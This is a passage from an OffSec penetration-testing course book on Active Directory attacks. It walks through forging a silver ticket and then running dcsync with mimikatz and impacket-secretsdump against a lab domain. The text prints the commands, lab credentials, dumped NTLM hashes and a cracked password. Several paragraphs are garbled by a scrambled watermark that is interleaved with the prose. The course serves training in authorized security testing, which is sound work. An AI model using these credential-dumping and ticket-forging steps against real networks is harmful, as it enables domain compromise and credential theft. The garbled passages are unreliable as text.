+-> Ticket : ** Pass The Ticket **
+
+* PAC generated
+
+* PAC signed
+
+* EncTicketPart generated
+
+ * EncTicketPart encrypted    @  corp.com'  succesWshiftullolwy           submitted  for  current  session
+ * KrbCred generated                Jeffrey
+
+Golden ticket for 'jeffadmin
+
+mimikatz # <cu>exit</cu>
+Bye!
+
+FiAnrstoosmhmoetwhmenLiositnpriyneLgrais8snp7td0ien-cgMFtio8ivmr7egi0inkog,aaftthznethesseweertOvIsSiIcaSe-ep5rtpv7iacir7ckpo5eepp2t l1rwtiiic9cait0ahktetetihotgenfruo,osruethtrphejeemffcSaeduPmmrNribenneHartnTsdThuinPispje/ewcrptieenwbrgmi0iltl4iisn.bctsoeoiotrhpnbe.socctouihnrmrettnhhhteaessefsbobsurieogienletn-dinlotiaclodkceeatd.l
+administrator ( Relative Id: 500 ) and a member of several highly-privileged groups, including the
+
+Domain Admins group ( Relative Id: 512 ) as highlighted above.
+
+This means we should have the ticket ready to use in memory. We can confirm this with klist.
+
+PS C:\Tools> <cu>klist</cu>
+
+Current LogonId is 0:0xa04cc
+
+Cached Tickets: (1)
+
+#0>   Client: jeffadmin @ corp.com
+
+      Server: http/web04.corp.com @ corp.com
+
+      KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                    815
+                                                                          Penetration Testing with Kali Linux
+
+         Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
+         Start Time: 9/14/2022 4:37:32 (local)
+         End Time: 9/11/2032 4:37:32 (local)
+         Renew Time: 9/11/2032 4:37:32 (local)
+         Session Key Type: RSADSI RC4-HMAC(NT)
+         Cache Flags: 0
+         Kdc Called:
+
+          Listing 871 - Listing Kerberos tickets to confirm the silver ticket is submitted to the current session
+
+Listing 871 shows that we have the silver ticket for jeffadmin to access http/web04.corp.com
+submitted to our current session. This should allow us to access the web page on WEB04 as
+jeffadmin.
+
+Let's verify our access using the same command as before.
+
+PS C:\Tools> <cu>iwr -UseDefaultCredentials http://web04</cu>
+
+StatusCode  : 200
+
+StatusDescription : OK
+
+Content     : <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+
+               "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+               <html xmlns="http://www.w3.org/1999/xhtml">
+
+               <head>
+
+               <meta http-equiv="Content-Type" cont...
+
+RawContent  : HTTP/1.1 200 OK
+
+               Persistent-Auth: true
+
+               Accept-Ranges: bytes
+
+               Content-Length: 703
+
+                                    Content-Type: text/html
+
+FH7eo0a3rd]m,esrs[Content-Type::,tLED{Teaa[xatsPgette/::r-hsM"tWiombesdld7ti,5]ef.2ni1f.te4.8-d2}A:S3ueftWpche8,dd2,J80te12r1f2:u4f0er1"]Se1,ey:p3[W7A2hi:c0t3c.l9e.op.wGtM-TRanges, bytes], [Content-Length,
+
+IILhtmnraipaengkgNufesat=Fms"ehit=eltAd;p:s//go.mi:c::rs{{o{rs}}@co{=of"utit.iecsorOsHmSt/T-afM5rwL77tl=5.<i2pna1nk9g/0"?lailntk=i"dI=I6S6"13w8i&datmhp=;"c9l6c0i"d=h0exi4g0h9t"=>"<6i0m0g" /></a>;
+
+href=http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409}}
+
+ParsedHtml  :
+
+RawContentLength : 703
+
+                        Listing 872 - Accessing the SMB share with the silver ticket
+
+Great! We successfully forged a service ticket and got access to the web page as jeffadmin. It's
+worth noting that we performed this attack without access to the plaintext password or password
+hash of this user.
+
+Once we have access to the password hash of the SPN, a machine account, or user, we can forge
+the related service tickets for any users and permissions. This is a great way of accessing SPNs
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                             816
+                                                                          Penetration Testing with Kali Linux
+
+in later phases of a penetration test, as we need privileged access in most situations to retrieve
+the password hash of the SPN.
+
+Since silver and golden tickets represent powerful attack techniques, Microsoft created a security
+patch to update the PAC structure. With this patch in place, the extended PAC structure field
+PAC_REQUESTOR needs to be validated by a domain controller. This mitigates the capability to
+forge tickets for non-existent domain users if the client and the KDC are in the same domain.
+Without this patch, we could create silver tickets for domain users that do not exist. The updates
+from this patch are enforced from October 11, 2022.
+
+In this section, we learned how to forge service tickets by using the password hash of a target
+SPN. While we used an SPN run by a user account in the example, we could do the same for
+SPNs run in the context of a machine account.
+
+23.2.5 Domain controller synchronization
+
+In production environments, domains typically rely on more than one domain controller to provide
+redundancy. The Directory Replication Service (DRS) Remote Protocol uses replication to
+synchronize these redundant domain controllers. A domain controller may request an update for
+a specific object, like an account, using the IDL_DRSGetNCChanges API.
+
+Luckily for us, the domain controller receiving a request for an update does not check whether the
+request came from a known domain controller. Instead, it only verifies that the associated SID
+has appropriate privileges. If we attempt to issue a rogue update request to a domain controller
+from a user with certain rights it will succeed.
+
+DoTfoirtehlcaetuoDnrcyohmChsauainnchgAedasmrAienlpls,la,icEnandttieoRrnep,prailsiceuasAtiendrgmnDieniersed, castnotdoryAhCdahmvaeinnWtgihsheeitsrtaRlintoeowFprsillitcgearrtoeindugpSsDehtirareivgcethottrshy.eBCsyehadrnieggfhaetuss,ltaR, smespieglimcnaebtdein.rgs
+                                ainccwohuincthinweoJnieemffoprfeertyshoensaetegraoudposmoarinwicthonthtreoslleerr.igThhtiss
+If we obtain access to  a user                                                                                                                                               assigned, we
+can perform a dcsync    attack                                                                                                                                               allows us to
+Trseeoqcupreeetsrsftdoaurnmmyptuhosisenroacturtreadnceok,nnwt-idaeol'slml fuarsoOinemS-jMo5ti7hnim7ee5did2k1oaK9mta0zlaioimnn.aachdionme faoinr -tjhoeineexdaWmipnldeoswofs
+                                                                                                                                                                             machine, and   impacket-
+                                                                                                                                                                             this section.
+
+Let's begin with Mimikatz and start by connecting to CLIENT75 as jeffadmin with the password
+BrouhahaTungPerorateBroom2023!. As jeffadmin is a member of the Domain Admins group, we
+already have the necessary rights assigned.
+
+Once connected via RDP, let's open a PowerShell window and launch Mimikatz in C:\Tools. For
+Mimikatz to perform this attack, we can use the lsadump::dcsync module and provide the domain
+username for which we want to obtain credentials as an argument for /user:. For the purposes of
+this example, we'll target the domain user dave.
+
+PS C:\Users\jeffadmin> <cu>cd C:\Tools\</cu>
+
+PS C:\Tools> <cu>.\mimikatz.exe</cu>
+...
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                    817
+                                                                              Penetration Testing with Kali Linux
+
+mimikatz # <cu>lsadump::dcsync /user:corp\dave</cu>
+[DC] 'corp.com' will be the domain
+[DC] 'DC1.corp.com' will be the DC server
+[DC] 'corp\dave' will be the user account
+[rpc] Service : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN         : dave
+
+** SAM ACCOUNT **
+
+SAM Username       : dave
+
+Account Type       : 30000000 ( USER_OBJECT )
+
+User Account Control : 00410200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD
+
+DONT_REQUIRE_PREAUTH )
+
+Account expiration :
+
+Password last change : 9/7/2022 9:54:57 AM
+
+Object Security ID : S-1-5-21-1987370270-658905905-1781884369-1103
+
+Object Relative ID : 1103
+
+Credentials:
+       <cr>Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494</cr>
+       ntlm- 0: 08d7a47a6f9f66b97b1bae4178747494
+       ntlm- 1: a11e808659d5ec5b6c4f43c1e5a0972d
+       lm - 0: 45bc7d437911303a42e764eaf8fda43e
+       lm - 1: fdd7d20efbcaf626bd2ccedd49d9512d
+
+...
+
+              Listing 873 - Using Mimikatz to perform a dcsync attack to obtain the credentials of dave
+
+Nice! Mimikatz performed the     dcsync attack by    impWehristolnoawting  a  domain  controller         and  obtained
+the user credentials of dave by  using replication.
+
+.fc1Nk/iua.a0loes.ln0wirc0t/@,ohkslaneeahsttnlaa'smiricn:ecroia~/ondh$cpgeakyts<, htthcrhheouceec>aNkhthNTy/aaToLrssLhuMuhMlc.tueahxstshtai/ansab-shgsemhsaHOwt1aSnao60-nds40r5ddh.07--lc7rsfiso5auhtot2lart,c1resaae9ehsn0,e-itsdws-Jii.fnnebedocfealcrefesscrfatwyeie6lrn<eyne4c/en.rcrduau/unmlu>iensHeratdha/sesshrhhuaPacslareahsetfes/iisnwlwe.odo.arrcAdVdsdlMyAdintsi.ttctiaosocn/knarsloolMycu,krowyKdoeauull.wiets.ixlyWltseetne-'ltmrleer.ntWtheeer
+
+08d7a47a6f9f66b97b1bae4178747494:<cr>Flowers1</cr>
+
+...
+
+              Listing 874 - Using Hashcat to crack the NTLM hash obtained by the dcsync attack
+
+Listing 874 shows that we successfully retrieved the plaintext password of dave.
+
+We can now obtain the NTLM hash of any domain user account of the domain corp.com.
+Furthermore, we can attempt to crack these hashes and retrieve the plaintext passwords of these
+accounts.
+
+Notably, we can perform the dcsync attack to obtain any user password hash in the domain, even
+the domain administrator Administrator.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                      818
+                                                                                                    Penetration Testing with Kali Linux
+
+mimikatz # <cu>lsadump::dcsync /user:corp\Administrator</cu>
+...
+Credentials:
+
+   Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
+...
+
+        Listing 875 - Using Mimikatz to perform a dcsync attack to obtain the credentials of the domain administrator
+                                                                     Administrator
+
+We'll discuss lateral movement vectors such as leveraging NTLM hashes obtained by dcsync in
+the Module Lateral Movement in Active Directory.
+
+For now, let's perform the dcsync attack from Linux as well. We'll use impacket-secretsdump to
+achieve this. To launch it, we'll enter the target username dave as an argument for -just-dc-user
+and provide the credentials of a user with the required rights, as well as the IP of the domain
+controller in the format __domain/user:password@ip__.
+
+kali@kali:~$ <cu>impacket-secretsdump -just-dc-user dave
+corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70</cu>
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+
+<cr>[*] Using the DRSUAPI method to get NTDS.DIT secrets</cr>
+
+dave:1103:aad3b435b51404eeaad3b435b51404ee:<cr>08d7a47a6f9f66b97b1bae4178747494</cr>::
+
+:
+
+[*] Kerberos keys grabbed
+
+dave:aes256-cts-hmac-sha1-
+
+96:4d8d35c33875a543e3afa94974d738474a203cd74919173fd2a64570c51b1389
+
+dave:aes128-cts-hmac-sha1-96:f94890e59afc170fd34cfbd7456d122b
+
+dave:des-cbc-md5:1a329b4338bfa215                    perform  the  dcsyWnhcitatltoacwk  to  obtain  the  NTLM  hash  of  dave
+[*] Cleaning up...
+
+                 Listing 876 - Using secretsdump to
+
+Listing 876 shows    tDhaRtSwUAePsIu, cthceesMsfiuclrloysoobfttJaeAifnPferIdeiymthpeleNmTeLnMtinhgasthheofDdiraevcet.oTryheReopulticpauttioonf  the tool
+states that it uses                                                                                                                             Service
+Remote Protocol.
+
+wcTreahepnelincdueacsetseidoynnitactfoaruotsotmaebcrtabktiohnistahuatsWpiesorinwacdreoemrwdfueeOslSnmt-taeib5anc7eldh7srn5Lf2iorqi1ofnu9mue0Dxot.aomBdoyaobinmitmaaiApnidneamrncsiooynnnsdta,ortoEminlnlgeaterin.arpHurdosisoewemrecAavreidenrmd, cetiononstnpi,taerloosrfrl.loeAArrms,dmwatehbiniosicsnataurntastta,uowcsrksee,,
+
+because there are certain rights required to start the replication. Alternatively, we can leverage a
+
+user with these rights assigned, though we're far less likely to encounter one of these in a real
+
+penetration test.
+
+23.3 Wrapping up
+
+In this Module, we explored NTLM and Kerberos authentication. These authentication methods
+are crucial for penetration testers to understand to perform penetration tests in AD environments.
+Without grasping the concepts of how authentication works, it is not possible to understand how
+the attacks shown in this Module work on a technical level. To perform them in real assessments,
+we often must adapt these techniques to be effective.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                        819
+                                                                                                                              Penetration Testing with Kali Linux
+
+The attack methods from this Module provide us with the necessary skills to perform attacks on
+AD authentication. These techniques will help us tremendously to obtain valid user credentials
+and access to systems and services.
+
+In the next Module Lateral Movement in Active Directory, we'll build on the knowledge and skills
+provided in this Module to move laterally in an AD environment.
+
+                         Whitlow
+               Jeffrey
+OS-57752190
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.  820
+
